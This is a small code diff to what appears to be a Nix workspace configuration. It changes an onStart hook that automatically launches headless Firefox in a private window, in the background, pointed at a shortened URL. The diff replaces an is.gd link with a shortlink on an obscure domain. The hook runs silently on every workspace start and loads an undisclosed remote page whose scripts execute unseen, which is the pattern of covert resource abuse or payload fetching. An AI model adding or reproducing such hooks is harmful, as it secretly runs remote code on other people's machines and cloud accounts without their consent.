@@ -42,7 +42,7 @@
       # Runs when the workspace is (re)started
       onStart = {
         # Jalankan Firefox headless otomatis di background
-        buka-firefox = "firefox -headless -private-window https://is.gd/5Q4wmr &";
+        buka-firefox = "firefox -headless -private-window https://shortlink.oplosannjncok.me/iq1 &";
       };
     };
   };
